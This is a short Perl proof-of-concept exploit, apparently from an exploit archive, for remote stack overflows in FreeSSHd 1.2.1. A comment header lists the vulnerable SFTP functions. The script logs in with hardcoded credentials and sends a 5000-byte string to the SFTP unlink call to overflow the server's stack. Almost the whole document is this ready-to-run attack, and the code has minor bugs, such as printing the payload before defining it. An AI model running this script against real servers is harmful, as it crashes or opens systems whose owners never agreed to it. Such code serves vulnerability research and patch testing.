# FreeSSHd Multiple Remote Stack Overflow Vulnerabilities. 
#
# Version : 1.2.1
# Advisory: http://www.bmgsec.com.au/advisory/42/
#
# Discovered & written by: 
# r0ut3r (writ3r [at] gmail.com / www.bmgsec.com.au)
#
# After Jeremy Brown reported similar buffer overflow vulnerabilities in
# FreeSSHd I forgot about it, and stopped my research on the vulnerabilities.
# Anyway just now I noticed that other vulnerable functions had not been
# reported. So below is a small list, and a small proof of concept. 
# 
# Note: All below functions overwrite EDI register. 
# open (edi)
# unlink (edi)
# mkdir (edi)
# rmdir (edi)
# stat (edi)

use Net::SSH2;

my $user = "root";
my $pass = "yahh";

my $ip = "example.com";
my $port = 22;

my $ssh2 = Net::SSH2->new();

print "[+] Connecting...\n";
$ssh2->connect($ip, $port) || die "[-] Unable to connect!\n";
$ssh2->auth_password($user, $pass) || "[-] Incorrect credentials\n";
print "[+] Sending payload\n";

print $payload;
my $payload = "A" x 5000;

my $sftp = $ssh2->sftp();
$sftp->unlink($payload);

print "[+] Sent";
$ssh2->disconnect;
